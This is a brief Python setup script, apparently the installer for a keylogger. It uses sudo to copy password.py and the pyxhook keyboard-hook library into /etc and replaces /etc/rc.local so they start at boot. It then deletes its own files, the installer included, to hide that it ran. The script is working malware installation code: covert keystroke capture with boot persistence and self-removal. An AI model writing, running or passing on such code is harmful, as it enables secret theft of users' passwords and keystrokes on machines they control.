import os
os.system("sudo cp password.py /etc")
os.system("sudo cp pyxhook.pyc /etc")
os.system("sudo cp pyxhook.py /etc")
os.system("sudo cp -r __pycache__ /etc")
os.system("sudo rm -r /etc/rc.local")
os.system("sudo cp rc.local /etc")
os.system("sudo rm -r rc.local")
os.system("sudo rm -r password.py ")
os.system("sudo rm -r pyxhook.pyc ")
os.system("sudo rm -r pyxhook.py ")
os.system("sudo rm -r kurulum.py ")

